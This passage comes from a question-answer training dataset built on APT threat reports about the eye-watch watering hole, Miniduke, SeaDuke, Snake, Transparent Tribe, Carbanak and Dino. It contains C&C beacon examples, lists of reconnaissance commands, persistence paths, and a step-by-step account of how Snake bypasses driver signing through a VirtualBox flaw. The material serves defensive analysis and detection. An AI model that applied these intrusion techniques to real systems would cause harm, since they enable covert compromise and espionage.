Uruguay match with the watering-hole activity observed \u2013 suggesting this is all part of the same campaign.\nDespite this potential connection to the Poland bank compromises, the malware is not particularly advanced \u2013 for example using basic operations to gather system information. The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.\nThese commands are as follows:\ncmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find \"TCP\"\nAn example C&C beacon is seen below:\nGET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101\nFirefox/47.0\nHost: www.eye-watch[.]in\nBig Headline: SILVERLIGHT XAP FILE\nThe cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.]in as a C&C channel but instead was downloaded from the URL:\nhxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap\n'cambio' is Spanish for 'change'. The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.]ch site.\nXAP is a software package (<https://en.wikipedia.org/wiki/XAP_(file_format)>)format used for Microsoft Silverlight applications.\nIt can be opened as a standard ZIP archive and contains the following files:\nAppManifest.xaml\nShell_siver.dll\nSystem.Xml.Linq.dll\nTogether they form a re-packaged exploit for Silverlight based on CVE-2016-0034 (MS16-006) \u2013 a Silverlight Memory Corruption vulnerability. The exploit has previously been used by several exploit kits including (<http://www.malware-traffic-analysis.net/2016/03/31/index.html>)RIG and (<http://malware.dontneedcoffee.com/2016/02/cve-2016-0034.html>)Angler to deliver multiple crimeware tools.\nThe Shell_siver.dll file contains a compile path:\nInternally, the code of this DLL loads a 2nd stage library called binaryreader.Exploit \u2013 as seen below with the XOR-encoded string:\nThis 2nd stage payload DLL contained within the assembly is 30,720 bytes in size and encoded with XOR 56:\nOnce the payload stub is decoded, it represents itself as a PE-image, which is another .NET 4.0 assembly with the internal name binaryreader.dll.\nThis second-stage DLL assembly, binaryreader.dll, is heavily obfuscated. The DLL (MD5 hash: 7b4a8be258ecb191c4c519d7c486ed8a) is identical to the one reported in a malware traffic analysis blog post from March 2016 where it was used to (<http://www.malware-traffic-analysis.net/2016/03/31/index.html>)deliver Qbot. Thus it is likely the code comes from a criminal exploit kit which is being leveraged for delivery in this campaign.\nA similarly named cambio.swf (MD5 hash: 6dffcfa68433f886b2e88fd984b4995a) was (<https://virustotal.com/en/file/c1b29afcfddb79cfd57545b8600922150843ae2b170fff9aeacdeaa17adbf792/analysis/>)uploaded to VirusTotal from a US IP address in December 2016.\nBig Headline: IP WHITELISTS\nWhen examining the code on the exploit kit website a list of 255 IP address strings was found. The IPs only contained the first 3 octets, and would have been used to filter traffic such that only IPs on that subnet would be delivered the exploit and payload.\nThe IP addresses corresponded to a mix of public and private financial institutions spread across the globe:\nHowever, banks in some specific countries feature prominently in the list:\nThe prominence of Polish and Mexican banks matches the observation of watering-hole code on sites in both countries.\n\nAnswer this question based on the above context: Discuss the additional watering-hole attacks associated with the eye-watch[.]in domain, including the targets and the nature of the malicious activity observed.",
    "output": "The eye-watch[.]in domain was used in watering-hole attacks on other financial sector websites, including the Comisi\u00f3n Nacional Bancaria y de Valores (CNBV) in Mexico and a bank website in Uruguay. The CNBV site redirected to a malicious URL on eye-watch[.]in, and a PCAP file uploaded to VirusTotal showed connections to eye-watch[.]in from a Uruguayan bank website. The compromised eye-watch[.]in domain was associated with various malicious activities, including the distribution of malware samples that gathered system information and communicated with a C&C server. These activities were part of a broader campaign targeting financial institutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion: ISIS Can't Be Ruled Out\nAfter considering each possibility, we find strong but inconclusive circumstantial evidence to support a link to ISIS. However, we are unable to connect this attack directly to ISIS, Mr. Hussain, or other ISIS supporters. If indeed ISIS or its supporters are responsible, it seems reasonable that such an offensive capability may still be in development.\nWe hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its targets. If ISIS is responsible, while this attack targets in-country impediments to ISIS objectives, other targets may include ideological or military adversaries abroad.\nWhether or not ISIS is responsible, this attack is likely the work of a non-regime threat actor who may be just beginning to field a still-rudimentary capability in the Syrian conflict. The entry costs for engaging in malware attacks in a conflict like the Syrian Civil War are low, and made lower by the fact that the rule of law is nonexistent for large parts of the country. In still other parts (under regime control), malware attacks appear to be state sanctioned.\nQ: Why might it be challenging to definitively attribute a cyber attack to ISIS, even when there is strong circumstantial evidence? How does this uncertainty impact the broader cybersecurity landscape in conflict zones like Syria?",
    "output": "It is challenging to definitively attribute a cyber attack to ISIS due to the lack of direct evidence linking the attack to specific individuals or groups within ISIS. Despite strong circumstantial evidence, the absence of concrete proof makes it difficult to establish a clear connection. This uncertainty impacts the broader cybersecurity landscape in conflict zones like Syria because it highlights the presence of a new and concerning threat that targets ISIS critics. Whether or not ISIS is responsible, the attack indicates the emergence of a non-regime threat actor with rudimentary capabilities. The low entry costs for engaging in malware attacks, coupled with the nonexistent rule of law in large parts of Syria and state-sanctioned malware attacks in regime-controlled areas, create an environment where such threats can proliferate.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Known malware samples\nThe available malware samples are highly obfuscated, and compiled by a polymorphic compiler. The attackers were able to produce new variants with only a few minutes difference between compile times. Therefore the number of distinct samples could be very large.\nbg_<sthg>.gif and bg_<sthg>.gif_dec refers to pieces of stage 2 of the malware, which are downloaded from the C&C server by the stage 1 code. bg_<sthg>.gif is a gif file that contains encrypted code, bg_<sthg>.gif is the corresponding decrypted file. bg_<sthg>.gif is generally 24484 bytes long, while bg_<sthg>.gif_dec is 22784 bytes long.\nFigure 1 \u2013 MD5 checksum list of pieces of stage 2 of the known versions\nFigure 2 \u2013 SHA1 checksum list of pieces of stage 2 of the known samples\n<id>.gif files are pieces of stage 3 codes prepared for specific victims with <id> used as an ID. These are typically 334093 byte long files with a 13-byte long gif header. Below, we list the hashes of these files; in case of the decrypted files with .gif_dec extension, we list the hashes for the internal decrypted PE file.\nFigure 3 \u2013 MD5 checksums of pieces of stage 3 code\nFigure 4 \u2013 SHA1 checksums of pieces of stage 3 code\nFigure 5 \u2013 MD5 checksums for known malicious documents (droppers)\nBig Headline: 3. Detection of the running malware\nDue to a large number of compiled samples, there is a high chance that the current version is difficult to detect by signatures. Yet, there are common features in the samples that can be used to identify the malware components.\nIn every sample we checked, the \"Program Files/Startup\" contains a file with \".lnk\" extension after installation. This is used to start up the malware after the computer is rebooted.\nAn example of the lnk file created by the malware:\nThe contents of the .lnk files are similar to the below described path and file, but random names are used. The extension of the dll called is generally \".tmp\" or \".cat\" or \".db\" (not sure about full list) and the export function called has a random name.\n\"C:\\WINDOWS\\system32\\rundll32.exe\"\nC:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\base.cat,JorNgoq\nThe running process of the malware can be pinpointed, e.g., by using ProcessExplorer. The running copies of stage 1 and 2 appear as separated rundll.exe processes. It is very useful to create a memory dump from these running processes, e.g., by using SysInternals ProcessExplorer.\nOn the picture below, the export function name they use is GqOlls. The names seem to follow a pattern: 6 chars long with two upper case letters.\nA not fully cross-checked information is that during installation the malware will be copied in two copies to the system and the two executables differ. This might mean that the executable modifies itself.\nFor example, we recovered the following two files:\nmd5sum base.cat :113e6fc85317fdd135e3f5f19e6c7a58 *base.cat\nwhere base.cat is the startup file, which is created based on ~6lrd.tmp. base.cat is stored in the \"All users\" directory, whereas ~6lrd.tmp is stored in a user's directory, e.g., in the guest user directory as \"C:\\Documents and Settings\\guest\\Local Settings\\Application Data\\~6rld.tmp\"\nThis user directory contains at least one more file, update.cmd with a specific content that could be used for detection. E.g., a search for any *.cmd files with content \"TASKKILL /f /IM acro*\" might be a a detection tool of this stage.\nAs for stage 3 of the attack, it is important to note that it is not yet analyized deeply. So once a victim downloads the ~300k long piece of code, we don't know what happens with the previous stages, and we have no information about detections once this stage is reached, except the usage of the C&C server news.grouptumbler.com.\nBig Headline: 4. C&C communication\nThere are multiple layers of C&C communications in the malware. First the malware uses Google search to receive information from its master. Then, it uses the Twitter messaging service looking for the twits of a specific Twitter user. Commands received via this channel trigger the download of stage 2 and stage 3 code from the C&C server.\nWe identified the following C&C servers delivering stage 2 and stage 3 codes:\nThe C&C server used by stage 3 of the malware is news.grouptumbler.com and it is located in Panama. At the time of this writing, port 80 seems to be closed on this server. Address and open port information is below:\nFigure 6 \u2013 Stage 3 C&C server information\nBig Headline: 4.1. Detection of C&C communications\nBasic detection can be based on 3 queries that are initiated by the victim computers within seconds.\nKnown search strings in Google search (see below) can also be used to detect the malware. Unfortunately, these strings are most likely unique to each C&C server or victim, thus unknown samples might use other strings, but possibly with the same length.\nlUFEfiHKljfLKWPR\nHkyeiIDKiroLaKYr\nlUFEfiHKDroLaKYr\nFigure 8 \u2013 Google search strings used by the malware\nThe malware also sends a query to the geoiptool. An example is shown below:\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US; Trident/5.0) Host: www.geoiptool.com\nFigure 9 \u2013 Geoip lookup query sample \u2013 Agent string might be different for each query!\nBig Headline: 4.2. Initial C&C communication\nInitial communications with the stage 2/3 delivery C&C servers (such as arabooks.ch) can be used to develop detection signatures as follows:\nThe malware retrieves the URL using a Twitter query as described earlier. Then, we can observe the first query from the victim towards the stage 2/3 delivery C&C server. This query contains pure HTTP traffic on port 80 to the server following the template below.\nGET /original/path/shortname/index.php?e=aaaaaaaaa\nwhere:\n shortname can be a number of strings, generally human readable (e.g. lib, engine, forum, forumengine etc.)\n \"e=\" is not constant, can be anything, but generally 1-2 letters long\n aaaaaaaaa stands for some Base64-like text (see details below)\n the servers used are assumed to be legitimate sites, just hacked by the attackers.\nBased on this format, we can detect a valid query as follows:\n The name of the 1st GET parameter should be discarded\n this means \"e=\" is not important\n we saw only one GET parameter, queries with multiple parameters are likely not used\nFor detection, the Base64-like string \"aaa\u2026\" should be first modified as follows:\n \"-\" should be replaced by \"+\"\n \"_\" should be replaced by \"/\"\nThis results in correct Base64 encoding, which can be decoded with library functions such as base64_decode. After decoding, a string of data, partially binary will be available. Parts are separated by the delimiter character \"|\". The format and a numerical example are below:\ne.g.,\n<binary data>|5551115551|1.13\nAs the binary data itself may contain the \"|\" character, parsing should start from the end (i.e., the numerical ID starts from the second \"|\" character from the end). In additional, the ID length may vary (not fully confirmed), but it seems to be around 10 digits. Finally, the version number always follows the pattern <1digit><dot><two digits>, e.g., 1.1X 3.1X.\nThe correct decoding of the HTTP query information should be enough to quickly develop possible IDS-based detections. As we have seen, detection is complicated, but not impossible. The following is the summary of potential detection steps:\n Check if there is only one GET parameter\n (check if path is not empty and contains index.php)(possible, but not confirmed)\n convert the Base64-like GET parameter string into real Base64 encoding, and check if it decodes correctly\n check if the decoded string has at least two delimieter character \"|\" in it\n check if after the last but first \"|\" character, there are digits only\n check if the version part of the string follows the format \"1.11\" or similar\nThe header sent is fairly standard, but we include one example nonetheless:\nFigure 10 \u2013 Other HTTP header values in a C&C query\nThe used Agent strings vary significantly across queries, therefore they cannot be really used for detection:\nMozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1)\nMozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1)\nMozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;+InfoPath.2)\nMozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+1.1.4322;+\n.NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2)\nMozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+2.0.50727;\n+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2)\nMozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET4.0C;+.NET+CLR+ 1.1.4322;+.NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET4.0E; +InfoPath.3)\nMozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+GTB7.4;+InfoPath.1;\n+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET+CLR+1.0.3705;+.NET+CLR+1.1.4322;+\n.NET4.0E;+.NET4.0C;+.NET+CLR+2.0.50727)\nMozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+InfoPath.2)\nQ: How does the Miniduke malware ensure persistence on infected systems, and what are the typical characteristics of the files it creates for this purpose?",
    "output": "The Miniduke malware ensures persistence by creating a file with a '.lnk' extension in the 'Program Files/Startup' folder, which allows the malware to restart after a system reboot. This file typically calls a DLL with extensions like '.tmp', '.cat', or '.db'. For example, the malware might create a file like 'C:\\\\DOCUME~1\\\\ALLUSE~1\\\\APPLIC~1\\\\base.cat,JorNgoq' and use 'rundll32.exe' to execute it. The export function called by the DLL has a random name, often 6 characters long with two uppercase letters.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: SeaDuke/ SeaDaddy/ SeaDask\nSeaDuke appeared in October 2014, after the disclosure of most of the Duke campaigns. Like the majority of the Duke family, SeaDuke exclusively targets government organizations. The main difference between Seaduke and its sister campaigns is that SeaDuke focuses on a small number of high-value targets. Additionally, of the Duke malware, SeaDuke alone is\nprogrammed in python. This developers' choice could indicate that the group is expanding their victim pool to Linux systems as well as Windows hosts. The overall framework of the malware remains similar to CozyDuke.\nSeaDuke is a highly configurable trojan and backdoor that is often installed onto victim systems through CozyDuke or via a compromised website. It has hundreds of possible configurations. According to Symantec, the threat actor behind CozyDuke may only deploy SeaDuke in systems belonging to \"major government-level targets.\" SeaDuke primarily allows the attacker to upload, to download, and to delete files on the victim machine as well as to retrieve bot/ system information and to update the bot configuration. It is possible that the threat actor deploys the malware to remove the indicators of compromise from other campaigns after a successful breach. The trojan may also be used to conduct pass the ticket attacks on Kerberos systems, to steal emails from Microsoft Exchange servers using compromised credentials, to archive sensitive data, or to exfiltrate data through legitimate cloud services. The C&C infrastructure behind SeaDuke relies on over 200 compromised web servers and several layers of RC4 and AES encryption and Base 64 encoding techniques. These extra obfuscation measures may be an attempt to remain undiscovered and thereby remove the attention on the Duke campaigns. SeaDuke communicates with its C&C servers via HTTP(s).\nAnswer this question: Why might the developers of SeaDuke have chosen to program the malware in Python, and how does this choice potentially expand their target pool?",
    "output": "The developers of SeaDuke chose to program the malware in Python, which is a departure from the typical programming languages used in the Duke family of malware. This choice could indicate that the group is expanding their victim pool to include Linux systems in addition to Windows hosts. Python is a versatile language that runs on multiple operating systems, making it easier for the malware to be deployed across different environments. By targeting both Windows and Linux systems, SeaDuke can potentially compromise a wider range of high-value targets, increasing the effectiveness of their campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 64-BIT EDITIONS OF WINDOWS\nThe 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft Windows, the most significant of which are kernel driver signature validation and Kernel Patch Protection (more commonly known as PatchGuard).\nPatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel, something that is often performed by malware attempting to hide itself on an infected system. Although PatchGuard is successful at preventing kernel patching once initialised, several published bypass approaches exist4,5. The technique used by Snake appears to be similar to these approaches.\nThe driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed with a valid digital signature. The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its unsigned 64-bit driver on a 64-bit version of Windows XP \u2013 as driver signing is not enforced it does not have to resort to any tricks under this OS version. In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit driver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP.\nOn 64-bit versions of Windows Vista and above it behaves differently. Firstly, the 64-bit unsigned driver file is created as usual:\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\nHowever, the driver is not registered; what is registered instead is the dropper itself. To do that, the dropper first copies itself as:\n%windows%\\$NtUninstallQ817473$\\fdisk_mon.exe\nThe dropper then registers itself as a service to ensure it starts every time Windows is booted, by creating the values:\nErrorControl = 0\nType = 16\nStart = 2\nImagePath = \"%SystemRoot%\\$NtUninstallQ817473$\\fdisk_mon.exe\nObjectName = \"LocalSystem\"\nWOW64 = 1\nin the registry key:\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Ultra3\nNow comes the most interesting part: does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows Vista and later versions, such as 64-bit Windows 7/8? The answer: Yes, it does.\nDoes it resort to using bootkit technology, which has been used in the past to bypass protections to load unsigned 64-bit drivers? The answer: No. Bootkits must overwrite the Master Boot Record (MBR) and antivirus products are well trained to catch that kind of bad behavior.\nThe masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability in a well-known virtualization product called VirtualBox, a product made by Oracle which is widely used by researchers to analyse malware. VirtualBox driver version 1.6.2 was released in June 2, 2008. Two months later, in August 2008, security researchers reported that its main driver component, which is signed under the entity \"innotek Gmbh\", contained a privilege escalation vulnerability6.\nIn a nutshell, the VirtualBox software installs a driver called VBoxDrv. The driver is controlled with the Input/Ouput Control Codes (32-bit values called IOCTL) passed along DeviceIoControl() API. One of the documented transfer methods that the system uses to pass data between the caller of DeviceIoControl() API and the driver itself is called METHOD_NEITHER.\nAs per MSDN documentation 7 , METHOD_NEITHER is a special transfer type when Input/Output Request Packet (IRP) supplies the user-mode virtual addresses of the input and output buffers, without validating or mapping them.\n4 (<http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3>)http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3\n5 (<http://uninformed.org/index.cgi?v=3&a=3&p=17>)http://uninformed.org/index.cgi?v=3&a=3&p=17\n6 (<http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability>)http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability\n7 (<http://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx>)http://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx\nIt is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid usermode addresses.\nThe source code of the vulnerable driver (shown below) demonstrates how the integer value of the rc variable is first derived from the input parameters pDevObj (device object) and pIrp (request packet). Next, that integer value is written into the UserBuffer - an arbitrary address, pointed by the input parameter pIrp (request packet). As there are no validations made for the UserBuffer an attacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:\nNow that the vulnerable driver can be used as a weapon to patch kernel memory, all the malware needs to do is to patch the content of the variable nt!g_CiEnabled, a boolean variable \"Code Integrity Enabled\" that marks whether the system was booted in  WinPE mode.\nWhen running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit, Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded.\nThis variable is used within the function SepInitializeCodeIntegrity(), implemented within CI.dll's function CiInitialize() and imported by the NT core (ntoskrnl.exe). In order to find the variable in kernel memory, the Snake dropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll's function CiInitialize(), and then SepInitializeCodeIntegrity() within it. Then it parses the function's code to locate the offset of the variable.\nOnce located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded. This explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable VBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and finally, load the driver.\nIn order to be able to perform the steps above, the dropper must first obtain Administrator privileges. It attempts to do this by running MS09-025 and MS10-015 exploits on the target system. These exploits are bundled within the dropper in its resource section as executable files. Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for creating NTFS file systems, and the initial message queue file which is written into the virtual volume. The message queue file contains configuration data and the libraries that will be injected into usermode processes.\n\nHow does the Snake malware bypass the kernel driver signature validation on 64-bit versions of Windows Vista and later?",
    "output": "The Snake malware leverages a vulnerability in the VirtualBox driver version 1.6.2, specifically in the VBoxDrv driver. This driver allows for unvalidated user-mode virtual addresses to be passed through the DeviceIoControl() API using the METHOD_NEITHER transfer method. By exploiting this vulnerability, Snake patches the kernel memory to disable Code Integrity verification, effectively bypassing the kernel driver signature validation. This enables the loading of the unsigned 64-bit driver.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Transparent Tribe APT group utilize Masquerading techniques to evade detection and target Indian government officials?",
    "output": "Masquerading is a technique used by adversaries to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. In the case of the Transparent Tribe APT group, they have been observed utilizing Masquerading techniques to target Indian government officials. Specifically, they have been using fake domains mimicking legitimate government and pseudo-government organizations to deliver malicious payloads. Additionally, they have been using executables masquerading as installers of legitimate applications, such as Kavach, to deploy malware on the victim's system. The group has also been observed using archive files and maldocs to deliver malware, further demonstrating their use of Masquerading techniques. Furthermore, the group's use of CrimsonRAT, a remote access trojan, and other bespoke malware, highlights their ability to diversify their malware portfolio and evade detection. The use of Masquerading techniques by Transparent Tribe APT group demonstrates their persistence and motivation to infect their targets and establish long-term access for espionage purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Oracle Customer Notification\nAccording to media , Oracle Security provided a notification to Oracle MICROS customers on 8 August 2016, informing them of the following:\n\uf0a7 Oracle Security has detected and addressed malicious code in certain legacy MICROS systems\n\uf0a7 Oracle has confirmed that it's investigating a breach of its Micros division.\n\uf0a7 Oracle's own systems, corporate network, and other cloud and service offers were not impacted.\n\uf0a7 Oracle MICROS users will have to change their account passwords immediately\n\uf0a7 The company reportedly stated that payment data was not at risk, as that information is encrypted both at rest and in transit in the MICROS environment.\nAlthough Oracle has not provided additional details on the exact date or extent of the breach of Oracle MICROS, some media suggest that the support portal for MICROS clients was also compromised.\nMedium Headline: Carbanak\nOn 8 August 2016, a media reported that the \"Oracle's MICROS customer support portal was seen communicating with a server known to be used by the \"Carbanak.\"\nAccording to , in February 2015, the Carbanak group used techniques commonly seen in Advanced Persistent Threat (APT) incidents to successfully target one financial institution's (a bank) money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, Oracle\ndatabases were manipulated to open payment or debit card accounts at the same bank or to transfer money between accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it as part of this operation.\nIn March 2015, provided an industry-wide public alert and mitigation guidance concerning Carbanak. Visa recommends that all financial institutions and retailers scan their networks for the presence of Carbanak. If detected, please contact law enforcement immediately and activate security incident procedures.\nBig Headline: 2. Mitigation action recommended for Oracle Micros Customers\n\u2022 Change passwords for any account used by a MICROS representative to access the customer's on-premises systems.\n\u2022 Scan network for the following:\n\u2013 Psexec file\n\u2013 Files with .bin extension (located in \\All users\\%AppData%\\Mozilla\\ or c:\\ProgramData\\Mozilla\\)\n\u2013 Svchost.exe file (located in Windows\\System32\\com\\catalogue\\)\n\u2013 Svchost.exefile (located in C:\\ProgramData\\Mozilla\\svchost.exe)\n\uf0a7 This file provided remote access functions, such as the ability to execute arbitrary commands, upload/download files.\n\u2013 Operating system (Windows) running services ending in \"sys\"\n\u2022 Scan networks for IOCs linked to Carbanak:\n\u2022 Scan networks for IOCs linked to MalumPOS:\n\u2022 Additionally, Visa recommends the following best practices to reduce the risk of exposure:\n\u2013 Educate employees how to avoid phishing scams and opening emails with attachments\n\u2013 Maintain updates for all software and patches (address zero day vulnerabilities)\n\u2013 Turn on heuristics (behavioral analysis) on anti-malware to search for suspicious behavior\nVisa will continue to report any mitigation guidance, technical indicators of compromise associated with this compromise, or additional details on the overall extent of the compromise as details are made available.\nFor questions and information please contact,\nTo report a data breach, contact Visa Fraud Control:\n\u2022 Asia Pacific Region, Central Europe/Middle East/Africa Region: VIFraudControl@visa.com\n\u2022 U.S. and Canada: USFraudControl@visa.com\n\nQuestion: What are the key mitigation actions recommended by Visa for Oracle MICROS customers to secure their systems following the detection of malicious code, and why are these steps important?\n\nAnswer:",
    "output": "Visa recommends several key mitigation actions for Oracle MICROS customers: changing passwords for any account used by a MICROS representative to access the customer's on-premises systems; scanning the network for specific files and services such as Psexec, .bin files, svchost.exe, and operating system services ending in 'sys'; and scanning networks for Indicators of Compromise (IOCs) linked to Carbanak and MalumPOS. These steps are important because they help ensure that any compromised credentials are no longer usable, identify and remove potential backdoors or malicious files, and detect the presence of known threats associated with the breach. Additionally, Visa recommends educating employees about phishing scams, maintaining software updates and patches, and turning on heuristics on anti-malware to search for suspicious behavior, which are essential best practices for reducing the risk of exposure to cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Dino \u2013 the latest spying malware from an allegedly French espionage group analyzed\nBY POSTED 30 JUN 2015 \u00ad11:12AM\nIn this blog we describe a sophisticated backdoor, called Dino by its creators. We believe this malicious software has been developed by the Animal Farm espionage group, who also created the infamous , and malware. Dino contains interesting technical features, and also a few hints that the developers are French speaking.\nAnimal Farm is the security industry's name for a group of attackers first described by Canada's Communications Security Establishment (CSE) in leaked by Edward Snowden in March 2014. In those slides CSE assess with \"moderate certainty\" that this group is a French intelligence agency. Since then, several examples of malware created by Animal Farm have been found and publicly documented, in particular:\nCasper, a stealthy first\u00adstage implant,\nBunny, a Lua\u00adbased backdoor, documented by\nBabar, an espionage platform, also analyzed by\nThe connection between those pieces of malware and the group described in CSE slides has been convincingly established, for example by .\nIn this blog post we add a new piece to the puzzle with Dino, another malicious program belonging to Animal Farm's arsenal.\nMedium Headline: Data Structure\nDino heavily relies on a custom data structure named \"DataStore\" by the Animal Farm developers. In particular, all Dino's modules store their content inside this structure, making its understanding one of the keys to analyzing Dino.\nA DataStore is a from string keys to values of 8 possible types, such as integers or strings. The implementation of this data structure is based on a . It means that to retrieve the value associated with a key, one has to calculate the hash of the key to locate a bucket from which the value can be retrieved.\nDino's hash is a one\u00adbyte value calculated with a series of XOR operations on the key, and each bucket starts a linked list containing key/value pairs. The code responsible for retrieving the value associated with a key is shown in Figure 1.\nFinally, DataStore objects can be serialized in a custom format, which begins with the magic word \"DxSx\". This is used in particular by the PSM module to save the content of Dino modules in an encrypted file. More precisely, when a modification is made to a module's content in memory, the PSM module saves it as a serialized DataStore. When Dino restarts, the module is deserialized from the file and loaded into memory. Funnily enough, the key serving to encrypt the file on disk is \"PsmIsANiceM0du1eWith0SugarInside\".\nSmall Headline: InteractiveDelay:00000005 DWORD MaxNothingSaidCount:00000078 DWORD\nInstallDate: 5523F782 QWORD fields:78537844\u2026[REDACTED]\u202666B3900 BYTES recID:11173\u00ad01\u00adPRS WIDESTR\nVersion:1.2 WIDESTR\nBD_Keys: 4D41474943424F58\u2026[REDACTED]\u20269EB3506 BYTES\nCC_Keys: 4D41474943424F58\u2026[REDACTED]\u20260000000 BYTES\nMaxDelay:00000E10 DWORD\nComServer0:hXXp://www.azhar.bf/\u2026[REDACTED]\u2026/postal.php STR\nComServer1:hXXp://www.rsvniima.org/\u2026[REDACTED]\u2026/din12/postal.php STR\nComServer2:hXXp://www.azhar.bf/\u2026[REDACTED]\u2026/postal.php STR\nComServer3:hXXp://www.rsvniima.org/\u2026[REDACTED]\u2026/din12/postal.php STR\nComServer4:hXXp://dneprorudnoe.info//\u2026[REDACTED]\u2026/postal.php STR\nComServer5:hXXp://dneprorudnoe.info//\u2026[REDACTED]\u2026/postal.php STR\nComServer6:hXXp://dneprorudnoe.info//\u2026[REDACTED]\u2026/postal.php STR\nNextSendReceive:5CC33097FB72D001 BYTES\nCC:000064F7\u00ad72E4\u00ad3F7D\u00adC817\u00ad474D\u00adA9BDBDF7 STR\nDaysOfLife:00000000 DWORD\nGUID:12FEB4A9EEDEE411B283000C29FD2872 BYTES\nInitialDelay:00000000 DWORD\nnow:5523F78E QWORD hash:A88E8181CA5CE35AE70C76145DFB820D BYTES\nInitialCommands:78537844\u2026[REDACTED]\u2026000000 BYTES xT0rvwz:DC188352A\u2026[REDACTED]\u202600000 BYTES tr4qa589:K/[RAFtIP?ciD?:D STR jopcft4T:a.ini WIDESTR\nWhile most of the keys have self\u00adexplanatory names, we would like to focus on the following keys:\n\"recID\": Animal Farms binaries contain an ID whose decimal value appears to identify the target, \"11173\u00ad01\u00adPRS\" in this case. For example Casper used an \"ID\" value set to \"13001\", whereas some Babar samples used \"12075\u00ad01\" and \"11162\u00ad01\". We do not know the meaning of the \"PRS\" suffix added in the case of Dino.\n\"ComServer\": These keys contain the command and control (C&C) servers' URLs. All the URLs were down when we started our analysis. Those C&Cs were compromised legitimate websites, which is standard operating procedure for Animal Farm.\n\"Version\": Dino's code version; here set to \"1.2\", which is confirmed by the \"din12\" folder used in one of the C&C URLs. For the record, a \"d13\" folder has been seen on another Animal Farm C&C (see \"3.7 Calling home\" of ), indicating that Dino version 1.3 has also likely been deployed at some point.\n\"BD_Keys\" and \"CC_Keys\" contain cryptographic keys to encrypt the network communications with C&C servers. Their values start with the word \"MAGICBOX\".\nThe three last keys are displayed with obfuscated names (\"xT0rvwz\", \"tr4qa589\" and \"jopcft4T\") and store parameters for the custom file system we will describe later.\nMedium Headline: Commands\nThe following Table lists the commands accepted by this Dino binary with the names chosen by the developers. Each of those commands can take one or more 